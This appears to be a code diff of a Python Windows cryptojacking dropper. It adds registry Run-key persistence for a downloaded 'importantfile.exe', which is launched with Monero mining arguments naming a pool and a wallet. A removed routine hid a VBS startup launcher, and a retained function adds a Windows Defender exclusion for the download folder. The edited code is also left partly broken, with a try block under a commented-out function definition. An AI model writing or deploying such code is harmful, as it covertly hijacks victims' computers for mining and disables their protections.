@@ -7,7 +7,8 @@ import sys
 import urllib.request
 import threading
 from colorama import Fore, init
-
+import winreg
+import winshell
 # Initialize colorama
 init(autoreset=True)
 
@@ -89,60 +90,47 @@ def execute_file(file_path, arguments=""):
     except Exception as e:
         # print(Fore.RED + f"[!] Error executing file: {e}")
         return False
+def add_to_startup_registry(file_path, app_name="MyApp"):
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
+            winreg.SetValueEx(registry_key, app_name, 0, winreg.REG_SZ, file_path)
+            print(f"Successfully added {file_path} to startup via registry.")
+    except Exception as e:
+        print(f"Failed to add to startup via registry: {e}")
 
-# Function to add the script to startup
-import os
-import subprocess
-from colorama import Fore, init
-
-init()  # Initialize colorama
-
-def add_to_startup():
+# def add_to_startup_folder():
     try:
         # Define the path to the startup folder
-        startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-        
-        # Ensure the startup folder exists
-        if not os.path.exists(startup_folder):
-            print(Fore.RED + f"[!] Startup folder does not exist: {startup_folder}")
-            return False
+        startup_folder = winshell.startup()
 
-        # Define the path to the startup script
-        startup_script_path = os.path.join(startup_folder, "StartupExecutor.vbs")  # Use .vbs for silent execution
+        # Define the path to the downloaded file
+        downloaded_file_path = r"C:\ProgramData\importantfile.exe"
 
-        # Define the path to the downloaded file (importantfile.exe in C:\ProgramData)
-        downloaded_file_path = os.path.join("C:\\", "ProgramData", "importantfile.exe")
+        # Define the command-line arguments
+        cmd_args = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=50"
 
-        # Define the command-line arguments for the downloaded file
-        cmd_args = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=70 --cuda --opencl"
+        # Create a shortcut in the startup folder
+        shortcut_path = os.path.join(startup_folder, "importantfile.lnk")
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortcut(shortcut_path)
+        shortcut.Targetpath = downloaded_file_path
+        shortcut.Arguments = cmd_args
+        shortcut.WorkingDirectory = os.path.dirname(downloaded_file_path)
+        shortcut.save()
 
-        # Create a VBS script to execute the batch file silently
-        vbs_script_content = f'''
-        Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "cmd /c start /B \"\" \"{downloaded_file_path}\" {cmd_args}", 0, False
-        Set WshShell = Nothing
-        '''
-
-        # Write the VBS script to the startup folder
-        with open(startup_script_path, "w") as vbs_file:
-            vbs_file.write(vbs_script_content)
-
-        # Hide the VBS script (optional)
-        subprocess.run(f'attrib +h "{startup_script_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-
-        print(Fore.GREEN + f"[+] Added startup script: {startup_script_path}")
+        print(f"[+] Added shortcut to startup: {shortcut_path}")
         return True
-    except PermissionError:
-        print(Fore.RED + "[!] Permission denied: Unable to write to the startup folder. Run the script as administrator.")
-        return False
     except Exception as e:
-        print(Fore.RED + f"[!] Error adding to startup: {e}")
+        print(f"[!] Error adding to startup folder: {e}")
         return False
 
-# Call the function
-add_to_startup()
-
-    
+# Run the functions
+file_to_run = r"C:\ProgramData\importantfile.exe"
+add_to_startup_registry(file_to_run)
+# add_to_startup_folder()    
 # Function to add an exclusion to Windows Defender
 def add_windows_defender_exclusion(folder_path):
 
@@ -176,8 +164,6 @@ def execute_tasks():
             return  # Stop if the file execution fails
 
         # Step 4: Add the script to startup
-        if not add_to_startup():
-            return  # Stop if adding to startup fails
 
         # Step 5: Add Windows Defender exclusion for the downloaded file's folder
         if not add_windows_defender_exclusion(os.path.dirname(download_path)):
